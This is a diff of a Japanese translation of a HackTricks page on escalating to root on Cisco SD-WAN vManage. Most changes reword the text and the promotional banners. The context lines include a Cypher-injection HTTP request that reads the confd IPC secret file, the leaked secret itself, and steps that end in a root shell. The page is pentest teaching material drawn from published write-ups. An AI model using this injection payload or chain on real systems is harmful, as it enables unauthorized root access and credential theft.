@@ -2,13 +2,13 @@
 
 <details>
 
-<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
+<summary><strong>ゼロからヒーローまでAWSハッキングを学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>
 
-* **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**してみたいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
+* **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または**最新バージョンのPEASSにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
 * [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[NFTs](https://opensea.io/collection/the-peass-family)コレクションをご覧ください
-* [**公式PEASS＆HackTricks swag**](https://peass.creator-spring.com)を手に入れましょう
-* **[💬](https://emojipedia.org/speech-balloon/) [Discordグループ](https://discord.gg/hRep4RUj7f)に参加するか、[telegramグループ](https://t.me/peass)に参加するか、**Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**をフォローしてください。**
-* **ハッキングトリックを共有するために、[hacktricksリポジトリ](https://github.com/carlospolop/hacktricks)と[hacktricks-cloudリポジトリ](https://github.com/carlospolop/hacktricks-cloud)**にPRを提出してください。
+* [**公式PEASS＆HackTricksスウォッグ**](https://peass.creator-spring.com)を手に入れましょう
+* **[💬](https://emojipedia.org/speech-balloon/) [Discordグループ](https://discord.gg/hRep4RUj7f)に参加するか、[telegramグループ](https://t.me/peass)に参加するか、または**Twitter**で**私をフォロー**してください 🐦[@carlospolopm](https://twitter.com/hacktricks_live)**。**
+* **[hacktricksリポジトリ](https://github.com/carlospolop/hacktricks)と[hacktricks-cloudリポジトリ](https://github.com/carlospolop/hacktricks-cloud)**にPRを提出して、あなたのハッキングトリックを共有してください。
 
 </details>
 
@@ -16,7 +16,7 @@
 
 (例: [https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html](https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html))
 
-少し[ドキュメント](http://66.218.245.39/doc/html/rn03re18.html)を調べた結果、`confd`および異なるバイナリ（Ciscoのウェブサイトのアカウントでアクセス可能）に関連する、IPCソケットを認証するために、`/etc/confd/confd_ipc_secret`にあるシークレットを使用することがわかりました。
+少し調査した後、`confd`および異なるバイナリに関連する[ドキュメント](http://66.218.245.39/doc/html/rn03re18.html)（Ciscoのウェブサイトのアカウントでアクセス可能）を見つけました。IPCソケットを認証するために、`/etc/confd/confd_ipc_secret`にあるシークレットを使用することがわかりました。
 ```
 vmanage:~$ ls -al /etc/confd/confd_ipc_secret
 
@@ -26,7 +26,7 @@ vmanage:~$ ls -al /etc/confd/confd_ipc_secret
 
 ---
 
-Neo4jインスタンスを覚えていますか？ それは`vmanage`ユーザーの特権で実行されているため、以前の脆弱性を利用してファイルを取得することができます。
+当社のNeo4jインスタンスを覚えていますか？ それは `vmanage` ユーザーの特権で実行されているため、以前の脆弱性を使用してファイルを取得できます：
 ```
 GET /dataservice/group/devices?groupId=test\\\'<>\"test\\\\\")+RETURN+n+UNION+LOAD+CSV+FROM+\"file:///etc/confd/confd_ipc_secret\"+AS+n+RETURN+n+//+' HTTP/1.1
 
@@ -38,8 +38,8 @@ Host: vmanage-XXXXXX.viptela.net
 
 "data":[{"n":["3708798204-3215954596-439621029-1529380576"]}]}
 ```
-```
-`confd_cli` プログラムはコマンドライン引数をサポートしていませんが、`/usr/bin/confd_cli_user` を引数と共に呼び出します。したがって、独自の引数を指定して `/usr/bin/confd_cli_user` を直接呼び出すことができます。ただし、現在の権限では読み取ることができないため、rootfs から取得して scp を使用してコピーし、ヘルプを読んでシェルを取得する必要があります：
+```md
+The `confd_cli`プログラムはコマンドライン引数をサポートしていませんが、引数を指定して`/usr/bin/confd_cli_user`を呼び出します。したがって、独自の引数セットで`/usr/bin/confd_cli_user`を直接呼び出すことができます。ただし、現在の権限では読み取ることができないため、rootfsから取得してscpを使用してコピーし、ヘルプを読んでシェルを取得する必要があります：
 ```
 ```
 vManage:~$ echo -n "3708798204-3215954596-439621029-1529380576" > /tmp/ipc_secret
@@ -60,11 +60,11 @@ uid=0(root) gid=0(root) groups=0(root)
 ```
 ## パス2
 
-（例：[https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77](https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77)）
+（例：[https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77](https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77)からの引用）
 
-synacktivチームによるブログ¹では、ルートシェルを取得するためのエレガントな方法が説明されていますが、注意点として、ルートのみが読み取り可能な`/usr/bin/confd_cli_user`のコピーを取得する必要があります。私は、そのような手間をかけずにルートに昇格する別の方法を見つけました。
+synacktivチームによるブログ¹では、ルートシェルを取得するためのエレガントな方法が説明されていますが、注意点として、ルートによってのみ読み取り可能な`/usr/bin/confd_cli_user`のコピーを取得する必要があります。私は、そのような手間をかけずにルートに昇格する別の方法を見つけました。
 
-`/usr/bin/confd_cli`バイナリを分解すると、次のようなことが観察されました：
+`/usr/bin/confd_cli`バイナリを分解すると、次のようなことがわかりました：
 ```
 vmanage:~$ objdump -d /usr/bin/confd_cli
 … snipped …
@@ -95,8 +95,11 @@ vmanage:~$ objdump -d /usr/bin/confd_cli
 ```
 When I run “ps aux”, I observed the following (_note -g 100 -u 107_)  
 
-日本語訳:  
-「ps aux」を実行すると、次のように表示されました（_note -g 100 -u 107_）
+---
+
+日本語訳：
+
+「ps aux」を実行すると、以下のような結果が得られました（_note -g 100 -u 107_）
 ```
 vmanage:~$ ps aux
 … snipped …
@@ -165,12 +168,12 @@ bash-4.4#
 ```
 <details>
 
-<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
+<summary><strong>ゼロからヒーローまでAWSハッキングを学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>
 
-* **サイバーセキュリティ企業**で働いていますか？**HackTricksで会社を宣伝**したいですか？または**最新版のPEASSを入手したり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
-* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[NFTs](https://opensea.io/collection/the-peass-family)コレクションをご覧ください
+* **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**してみたいですか？または、**最新バージョンのPEASSを入手したり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
+* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう。当社の独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)コレクション
 * [**公式PEASS＆HackTricksスウェグ**](https://peass.creator-spring.com)を手に入れましょう
-* **[💬 Discordグループ](https://discord.gg/hRep4RUj7f)**に参加するか、[telegramグループ](https://t.me/peass)に参加するか、**Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**をフォローしてください。**
-* **ハッキングトリックを共有するには、[hacktricksリポジトリ](https://github.com/carlospolop/hacktricks)と[hacktricks-cloudリポジトリ](https://github.com/carlospolop/hacktricks-cloud)**にPRを提出してください。
+* **[💬](https://emojipedia.org/speech-balloon/) [Discordグループ](https://discord.gg/hRep4RUj7f)に参加するか、[telegramグループ](https://t.me/peass)に参加するか、または**Twitter**で**私をフォロー**する🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
+* **ハッキングトリックを共有するために、[hacktricksリポジトリ](https://github.com/carlospolop/hacktricks)と[hacktricks-cloudリポジトリ](https://github.com/carlospolop/hacktricks-cloud)**にPRを提出してください。
 
 </details>
